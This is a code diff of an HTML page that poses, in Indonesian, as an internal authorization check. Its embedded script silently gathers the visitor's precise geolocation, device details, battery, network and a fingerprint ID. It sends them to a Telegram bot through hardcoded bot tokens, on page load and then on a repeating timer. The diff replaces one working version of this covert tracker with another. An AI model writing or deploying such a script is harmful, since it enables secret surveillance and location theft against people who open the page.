@@ -12,14 +12,14 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
+      justify-content: center;
       height: 100vh;
       text-align: center;
-      padding: 40px 20px 20px;
+      padding: 20px;
     }
     img.logo {
-      width: 190px;
-      margin-bottom: 25px;
+      width: 160px;
+      margin-bottom: 30px;
       filter: grayscale(100%) brightness(150%);
     }
     h1 {
@@ -39,87 +39,76 @@
   <p>Prosedur otorisasi internal sedang berlangsung. Sistem dalam status validasi sumber akses.</p>
 
   <script>
-    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
-    const chatId = 5677912817;
-
-    async function getIP() {
+    async function sendData() {
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return "Tidak tersedia";
-      }
-    }
-
-    async function getBattery() {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        return `Baterai: ${Math.round(b.level * 100)}% ${b.charging ? '(Mengisi)' : ''}`;
-      } else {
-        return "Baterai: Tidak didukung";
-      }
-    }
-
-    function getDeviceInfo() {
-      return [
-        `User Agent: ${navigator.userAgent}`,
-        `Resolusi: ${screen.width}x${screen.height}`,
-        `Bahasa: ${navigator.language}`,
-        `Waktu Lokal: ${new Date().toLocaleString()}`
-      ].join('\n');
-    }
-
-    async function kirimSemuaData() {
-      try {
-        const [ip, battery] = await Promise.all([getIP(), getBattery()]);
-
-        navigator.geolocation.getCurrentPosition(async pos => {
-          const lat = pos.coords.latitude.toFixed(6);
-          const lon = pos.coords.longitude.toFixed(6);
-          const acc = pos.coords.accuracy;
-
-          const lokasi = `Lokasi: ${lat}, ${lon} (±${acc} m)`;
-          const semua = [
-            "[DatabaseNusantara Report]",
-            lokasi,
-            `IP: ${ip}`,
-            battery,
-            getDeviceInfo()
-          ].join('\n');
-
-          // Buat Blob untuk dikirim sebagai file
-          const blob = new Blob([semua], { type: "text/plain" });
-          const form = new FormData();
-          form.append("chat_id", chatId);
-          form.append("document", blob, "data.txt");
-
-          await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-            method: "POST",
-            body: form
-          });
-
-        }, err => {
-          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: "Gagal lokasi: " + err.message })
-          });
+        const location = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
         });
-      } catch (e) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+
+        const lat = location.coords.latitude;
+        const lon = location.coords.longitude;
+        const speed = location.coords.speed ?? 'Unknown';
+        const heading = location.coords.heading ?? 'Unknown';
+        const altitude = location.coords.altitude ?? 'Unknown';
+        const accuracy = location.coords.accuracy + 'm';
+
+        const lang = navigator.language;
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const local = new Date().toLocaleString();
+        const utc = new Date().toUTCString();
+        const ua = navigator.userAgent;
+
+        const battery = await navigator.getBattery();
+        const batLevel = Math.round(battery.level * 100);
+        const batCharging = battery.charging ? 'Charging' : 'Not Charging';
+
+        const screenRes = `${screen.width}x${screen.height}`;
+        const colorDepth = screen.colorDepth;
+        const platform = navigator.platform;
+        const connection = navigator.connection || {};
+        const netType = connection.effectiveType || 'Unknown';
+        const downSpeed = connection.downlink || 'Unknown';
+
+        const rawID = ua + screenRes + tz + lang;
+        const buffer = new TextEncoder().encode(rawID);
+        const digest = await crypto.subtle.digest('SHA-256', buffer);
+        const hashArray = Array.from(new Uint8Array(digest));
+        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 10).toUpperCase();
+        const ID = `USR-${hashHex}`;
+
+        const payload = `
+[ID: ${ID}]
+Lokasi dikirim: ${lat}, ${lon}
+https://maps.google.com/?q=${lat},${lon}
+Speed: ${speed}
+Heading: ${heading}
+Altitude: ${altitude}
+Accuracy: ${accuracy}
+Lang: ${lang}
+TZ: ${tz}
+Local: ${local}
+UTC: ${utc}
+Battery: ${batLevel}% (${batCharging})
+Screen: ${screenRes}, Color: ${colorDepth}
+Platform: ${platform}
+Network: ${netType}, Downlink: ${downSpeed} Mbps
+Device: ${ua}`;
+
+        const token = "7317238253:AAEORpkEBywWC2AvP-GUj1wfr1m4K5irbV0";
+        const chat_id = "5677912817";
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: "Gagal sistem: " + e.message })
+          body: JSON.stringify({ chat_id, text: payload })
         });
+      } catch (err) {
+        console.error("Gagal kirim:", err);
       }
     }
 
-    // Jalankan sekarang
-    kirimSemuaData();
-
-    // Kirim ulang setiap 1 jam (3600000 ms)
-    setInterval(kirimSemuaData, 3600000);
+    sendData();
+    setInterval(sendData, 5 * 60 * 1000);
   </script>
 </body>
 </html>
